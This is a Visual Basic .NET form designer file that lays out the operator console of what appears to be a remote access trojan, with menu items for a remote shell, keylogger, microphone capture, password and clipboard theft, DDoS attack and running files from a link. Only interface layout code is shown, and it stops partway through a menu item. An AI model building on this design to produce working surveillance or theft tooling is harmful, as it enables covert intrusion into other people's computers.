﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
        Me.c1 = New System.Windows.Forms.ComboBox()
        Me.c2 = New System.Windows.Forms.ComboBox()
        Me.c = New System.Windows.Forms.NumericUpDown()
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RunFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromDiskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromLinkToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ControlPanelToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.JToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteDesktopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteShellToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ProcessManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SdfdsfgdfToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TETEToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ChToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.KloToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DosToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ServersToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GOkaToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ActiveWindowsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OpenWebSiteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RecToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ComputerRestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ComputerShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LogOutComputerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StillnessToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RegeditToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GetPasswordsToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.GetClipBoardToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ExtrasToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.InformationToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CopyIPToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CLXToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartProcessToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ServerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RenameToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OpenDownloadFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CommentsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ii = New System.Windows.Forms.ImageList(Me.components)
        Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer3 = New System.Windows.Forms.Timer(Me.components)
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.ToolStripSeparator2 = New System.Windows.Forms.ToolStripSeparator()
        Me.ToolStripStatusLabel3 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
        Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.PictureBox3 = New System.Windows.Forms.PictureBox()
        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
        Me.SplitContainer2 = New System.Windows.Forms.SplitContainer()
        Me.VisualStudioTabControl2 = New comet.VisualStudioTabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.Panel4 = New System.Windows.Forms.Panel()
        Me.hard = New System.Windows.Forms.TextBox()
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.CheckBox2 = New System.Windows.Forms.CheckBox()
        Me.L1 = New comet.GClass9()
        Me.ColumnHeader15 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader16 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader17 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader18 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader19 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader20 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader21 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader22 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader23 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader24 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader25 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader26 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader27 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader28 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.SplitContainer3 = New System.Windows.Forms.SplitContainer()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.GClass91 = New comet.GClass9()
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ImageList2 = New System.Windows.Forms.ImageList(Me.components)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.gg = New System.Windows.Forms.Timer(Me.components)
        Me.Timer4 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer5 = New System.Windows.Forms.Timer(Me.components)
        Me.ToolTip1 = New System.Windows.Forms.ToolTip(Me.components)
        CType(Me.c, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.StatusStrip1.SuspendLayout()
        Me.Panel1.SuspendLayout()
        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SplitContainer2.Panel1.SuspendLayout()
        Me.SplitContainer2.Panel2.SuspendLayout()
        Me.SplitContainer2.SuspendLayout()
        Me.VisualStudioTabControl2.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.Panel4.SuspendLayout()
        Me.SplitContainer3.Panel1.SuspendLayout()
        Me.SplitContainer3.Panel2.SuspendLayout()
        Me.SplitContainer3.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'CheckBox1
        '
        Me.CheckBox1.AutoSize = True
        Me.CheckBox1.Checked = True
        Me.CheckBox1.CheckState = System.Windows.Forms.CheckState.Checked
        Me.CheckBox1.Location = New System.Drawing.Point(487, 364)
        Me.CheckBox1.Name = "CheckBox1"
        Me.CheckBox1.Size = New System.Drawing.Size(79, 17)
        Me.CheckBox1.TabIndex = 38
        Me.CheckBox1.Text = "CheckBox1"
        Me.CheckBox1.UseVisualStyleBackColor = True
        Me.CheckBox1.Visible = False
        '
        'c1
        '
        Me.c1.FormattingEnabled = True
        Me.c1.Location = New System.Drawing.Point(522, 370)
        Me.c1.Name = "c1"
        Me.c1.Size = New System.Drawing.Size(121, 21)
        Me.c1.TabIndex = 40
        Me.c1.Visible = False
        '
        'c2
        '
        Me.c2.FormattingEnabled = True
        Me.c2.Location = New System.Drawing.Point(522, 370)
        Me.c2.Name = "c2"
        Me.c2.Size = New System.Drawing.Size(121, 21)
        Me.c2.TabIndex = 39
        Me.c2.Visible = False
        '
        'c
        '
        Me.c.Location = New System.Drawing.Point(409, 398)
        Me.c.Name = "c"
        Me.c.Size = New System.Drawing.Size(120, 20)
        Me.c.TabIndex = 41
        Me.c.Value = New Decimal(New Integer() {20, 0, 0, 0})
        Me.c.Visible = False
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.BackColor = System.Drawing.Color.White
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RunFileToolStripMenuItem, Me.ControlPanelToolStripMenuItem, Me.OpenWebSiteToolStripMenuItem, Me.RecToolStripMenuItem, Me.RegeditToolStripMenuItem, Me.GetPasswordsToolStripMenuItem1, Me.GetClipBoardToolStripMenuItem, Me.ExtrasToolStripMenuItem, Me.StartProcessToolStripMenuItem, Me.ServerToolStripMenuItem, Me.OpenDownloadFolderToolStripMenuItem, Me.CommentsToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(169, 388)
        Me.ContextMenuStrip1.Text = "Get ClipBoard "
        '
        'RunFileToolStripMenuItem
        '
        Me.RunFileToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.RunFileToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromDiskToolStripMenuItem, Me.FromLinkToolStripMenuItem})
        Me.RunFileToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.RunFileToolStripMenuItem.Image = CType(resources.GetObject("RunFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RunFileToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RunFileToolStripMenuItem.Name = "RunFileToolStripMenuItem"
        Me.RunFileToolStripMenuItem.Size = New System.Drawing.Size(168, 32)
        Me.RunFileToolStripMenuItem.Text = "Run File"
        '
        'FromDiskToolStripMenuItem
        '
        Me.FromDiskToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.FromDiskToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.FromDiskToolStripMenuItem.Image = CType(resources.GetObject("FromDiskToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FromDiskToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.FromDiskToolStripMenuItem.Name = "FromDiskToolStripMenuItem"
        Me.FromDiskToolStripMenuItem.Size = New System.Drawing.Size(159, 30)
        Me.FromDiskToolStripMenuItem.Text = "Run From Disk"
        '
        'FromLinkToolStripMenuItem
        '
        Me.FromLinkToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.FromLinkToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.FromLinkToolStripMenuItem.Image = CType(resources.GetObject("FromLinkToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FromLinkToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.FromLinkToolStripMenuItem.Name = "FromLinkToolStripMenuItem"
        Me.FromLinkToolStripMenuItem.Size = New System.Drawing.Size(159, 30)
        Me.FromLinkToolStripMenuItem.Text = "Run From Link"
        '
        'ControlPanelToolStripMenuItem
        '
        Me.ControlPanelToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.ControlPanelToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.JToolStripMenuItem, Me.RemoteDesktopToolStripMenuItem, Me.RemoteShellToolStripMenuItem, Me.ProcessManagerToolStripMenuItem, Me.SdfdsfgdfToolStripMenuItem, Me.TETEToolStripMenuItem, Me.TToolStripMenuItem, Me.ChToolStripMenuItem, Me.KloToolStripMenuItem, Me.DosToolStripMenuItem, Me.ServersToolStripMenuItem, Me.GOkaToolStripMenuItem, Me.ActiveWindowsToolStripMenuItem})
        Me.ControlPanelToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.ControlPanelToolStripMenuItem.Image = CType(resources.GetObject("ControlPanelToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ControlPanelToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ControlPanelToolStripMenuItem.Name = "ControlPanelToolStripMenuItem"
        Me.ControlPanelToolStripMenuItem.Size = New System.Drawing.Size(168, 32)
        Me.ControlPanelToolStripMenuItem.Text = "Control Panel"
        '
        'JToolStripMenuItem
        '
        Me.JToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.JToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.JToolStripMenuItem.Image = CType(resources.GetObject("JToolStripMenuItem.Image"), System.Drawing.Image)
        Me.JToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.JToolStripMenuItem.Name = "JToolStripMenuItem"
        Me.JToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.JToolStripMenuItem.Text = "File Manager"
        '
        'RemoteDesktopToolStripMenuItem
        '
        Me.RemoteDesktopToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.RemoteDesktopToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.RemoteDesktopToolStripMenuItem.Image = CType(resources.GetObject("RemoteDesktopToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteDesktopToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RemoteDesktopToolStripMenuItem.Name = "RemoteDesktopToolStripMenuItem"
        Me.RemoteDesktopToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.RemoteDesktopToolStripMenuItem.Text = "Remote Desktop"
        '
        'RemoteShellToolStripMenuItem
        '
        Me.RemoteShellToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.RemoteShellToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.RemoteShellToolStripMenuItem.Image = CType(resources.GetObject("RemoteShellToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteShellToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RemoteShellToolStripMenuItem.Name = "RemoteShellToolStripMenuItem"
        Me.RemoteShellToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.RemoteShellToolStripMenuItem.Text = "Remote Shell"
        '
        'ProcessManagerToolStripMenuItem
        '
        Me.ProcessManagerToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.ProcessManagerToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.ProcessManagerToolStripMenuItem.Image = CType(resources.GetObject("ProcessManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ProcessManagerToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ProcessManagerToolStripMenuItem.Name = "ProcessManagerToolStripMenuItem"
        Me.ProcessManagerToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.ProcessManagerToolStripMenuItem.Text = "Process Manager"
        '
        'SdfdsfgdfToolStripMenuItem
        '
        Me.SdfdsfgdfToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.SdfdsfgdfToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.SdfdsfgdfToolStripMenuItem.Image = CType(resources.GetObject("SdfdsfgdfToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SdfdsfgdfToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.SdfdsfgdfToolStripMenuItem.Name = "SdfdsfgdfToolStripMenuItem"
        Me.SdfdsfgdfToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.SdfdsfgdfToolStripMenuItem.Text = "Installed Programs"
        '
        'TETEToolStripMenuItem
        '
        Me.TETEToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.TETEToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.TETEToolStripMenuItem.Image = CType(resources.GetObject("TETEToolStripMenuItem.Image"), System.Drawing.Image)
        Me.TETEToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.TETEToolStripMenuItem.Name = "TETEToolStripMenuItem"
        Me.TETEToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.TETEToolStripMenuItem.Text = "Microphone"
        '
        'TToolStripMenuItem
        '
        Me.TToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.TToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.TToolStripMenuItem.Image = CType(resources.GetObject("TToolStripMenuItem.Image"), System.Drawing.Image)
        Me.TToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.TToolStripMenuItem.Name = "TToolStripMenuItem"
        Me.TToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.TToolStripMenuItem.Text = "Scheduled Tasks"
        '
        'ChToolStripMenuItem
        '
        Me.ChToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.ChToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.ChToolStripMenuItem.Image = CType(resources.GetObject("ChToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ChToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ChToolStripMenuItem.Name = "ChToolStripMenuItem"
        Me.ChToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.ChToolStripMenuItem.Text = "Chat"
        '
        'KloToolStripMenuItem
        '
        Me.KloToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.KloToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.KloToolStripMenuItem.Image = CType(resources.GetObject("KloToolStripMenuItem.Image"), System.Drawing.Image)
        Me.KloToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.KloToolStripMenuItem.Name = "KloToolStripMenuItem"
        Me.KloToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.KloToolStripMenuItem.Text = "KeyLogger"
        '
        'DosToolStripMenuItem
        '
        Me.DosToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.DosToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.DosToolStripMenuItem.Image = CType(resources.GetObject("DosToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DosToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.DosToolStripMenuItem.Name = "DosToolStripMenuItem"
        Me.DosToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.DosToolStripMenuItem.Text = "Ddos Attack"
        '
        'ServersToolStripMenuItem
        '
        Me.ServersToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.ServersToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.ServersToolStripMenuItem.Image = CType(resources.GetObject("ServersToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ServersToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ServersToolStripMenuItem.Name = "ServersToolStripMenuItem"
        Me.ServersToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.ServersToolStripMenuItem.Text = "Service Manager"
        '
        'GOkaToolStripMenuItem
        '
        Me.GOkaToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.GOkaToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.GOkaToolStripMenuItem.Image = CType(resources.GetObject("GOkaToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GOkaToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.GOkaToolStripMenuItem.Name = "GOkaToolStripMenuItem"
        Me.GOkaToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.GOkaToolStripMenuItem.Text = "network"
        '
        'ActiveWindowsToolStripMenuItem
        '
        Me.ActiveWindowsToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.ActiveWindowsToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.ActiveWindowsToolStripMenuItem.Image = CType(resources.GetObject("ActiveWindowsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ActiveWindowsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ActiveWindowsToolStripMenuItem.Name = "ActiveWindowsToolStripMenuItem"
        Me.ActiveWindowsToolStripMenuItem.Size = New System.Drawing.Size(180, 30)
        Me.ActiveWindowsToolStripMenuItem.Text = "ActiveWindows"
        '
        'OpenWebSiteToolStripMenuItem
        '
        Me.OpenWebSiteToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.OpenWebSiteToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.OpenWebSiteToolStripMenuItem.Image = CType(resources.GetObject("OpenWebSiteToolStripMenuItem.Image"), System.Drawing.Image)
        Me.OpenWebSiteToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.OpenWebSiteToolStripMenuItem.Name = "OpenWebSiteToolStripMenuItem"
        Me.OpenWebSiteToolStripMenuItem.Size = New System.Drawing.Size(168, 32)
        Me.OpenWebSiteToolStripMenuItem.Text = "Open WebSite"
        '
        'RecToolStripMenuItem
        '
        Me.RecToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.RecToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ComputerRestartToolStripMenuItem, Me.ComputerShutdownToolStripMenuItem, Me.LogOutComputerToolStripMenuItem, Me.StillnessToolStripMenuItem})
        Me.RecToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.RecToolStripMenuItem.Image = CType(resources.GetObject("RecToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RecToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RecToolStripMenuItem.Name = "RecToolStripMenuItem"
        Me.RecToolStripMenuItem.Size = New System.Drawing.Size(168, 32)
        Me.RecToolStripMenuItem.Text = "Power PC"
        '
        'ComputerRestartToolStripMenuItem
        '
        Me.ComputerRestartToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.ComputerRestartToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.ComputerRestartToolStripMenuItem.Image = CType(resources.GetObject("ComputerRestartToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ComputerRestartToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ComputerRestartToolStripMenuItem.Name = "ComputerRestartToolStripMenuItem"
        Me.ComputerRestartToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.ComputerRestartToolStripMenuItem.Text = "Computer restart"
        '
        'ComputerShutdownToolStripMenuItem
        '
        Me.ComputerShutdownToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.ComputerShutdownToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.ComputerShutdownToolStripMenuItem.Image = CType(resources.GetObject("ComputerShutdownToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ComputerShutdownToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ComputerShutdownToolStripMenuItem.Name = "ComputerShutdownToolStripMenuItem"
        Me.ComputerShutdownToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.ComputerShutdownToolStripMenuItem.Text = "Computer shutdown"
        '
        'LogOutComputerToolStripMenuItem
        '
        Me.LogOutComputerToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.LogOutComputerToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.LogOutComputerToolStripMenuItem.Image = CType(resources.GetObject("LogOutComputerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.LogOutComputerToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.LogOutComputerToolStripMenuItem.Name = "LogOutComputerToolStripMenuItem"
        Me.LogOutComputerToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.LogOutComputerToolStripMenuItem.Text = "Log out computer"
        '
        'StillnessToolStripMenuItem
        '
        Me.StillnessToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.StillnessToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.StillnessToolStripMenuItem.Image = CType(resources.GetObject("StillnessToolStripMenuItem.Image"), System.Drawing.Image)
        Me.StillnessToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.StillnessToolStripMenuItem.Name = "StillnessToolStripMenuItem"
        Me.StillnessToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.StillnessToolStripMenuItem.Text = "Computer Stillness"
        '
        'RegeditToolStripMenuItem
        '
        Me.RegeditToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.RegeditToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.RegeditToolStripMenuItem.Image = CType(resources.GetObject("RegeditToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RegeditToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RegeditToolStripMenuItem.Name = "RegeditToolStripMenuItem"
        Me.RegeditToolStripMenuItem.Size = New System.Drawing.Size(168, 32)
        Me.RegeditToolStripMenuItem.Text = "Remote Regedit"
        '
        'GetPasswordsToolStripMenuItem1
        '
        Me.GetPasswordsToolStripMenuItem1.BackColor = System.Drawing.Color.Gainsboro
        Me.GetPasswordsToolStripMenuItem1.ForeColor = System.Drawing.Color.Black
        Me.GetPasswordsToolStripMenuItem1.Image = CType(resources.GetObject("GetPasswordsToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.GetPasswordsToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.GetPasswordsToolStripMenuItem1.Name = "GetPasswordsToolStripMenuItem1"
        Me.GetPasswordsToolStripMenuItem1.Size = New System.Drawing.Size(168, 32)
        Me.GetPasswordsToolStripMenuItem1.Text = "Get Passwords"
        '
        'GetClipBoardToolStripMenuItem
        '
        Me.GetClipBoardToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.GetClipBoardToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.GetClipBoardToolStripMenuItem.Image = CType(resources.GetObject("GetClipBoardToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GetClipBoardToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.GetClipBoardToolStripMenuItem.Name = "GetClipBoardToolStripMenuItem"
        Me.GetClipBoardToolStripMenuItem.Size = New System.Drawing.Size(168, 32)
        Me.GetClipBoardToolStripMenuItem.Text = "Get ClipBoard "
        '
        'ExtrasToolStripMenuItem
        '
        Me.ExtrasToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.ExtrasToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.InformationToolStripMenuItem, Me.CopyIPToolStripMenuItem, Me.CLXToolStripMenuItem})
        Me.ExtrasToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.ExtrasToolStripMenuItem.Image = CType(resources.GetObject("ExtrasToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ExtrasToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ExtrasToolStripMenuItem.Name = "ExtrasToolStripMenuItem"
        Me.ExtrasToolStripMenuItem.Size = New System.Drawing.Size(168, 32)
        Me.ExtrasToolStripMenuItem.Text = "About System"
        '
        'InformationToolStripMenuItem
        '
        Me.InformationToolStripMenuItem.BackColor = System.Drawing.Color.Gainsboro
        Me.InformationToolStripMenuItem.ForeColor = System.Drawing.Color.Black
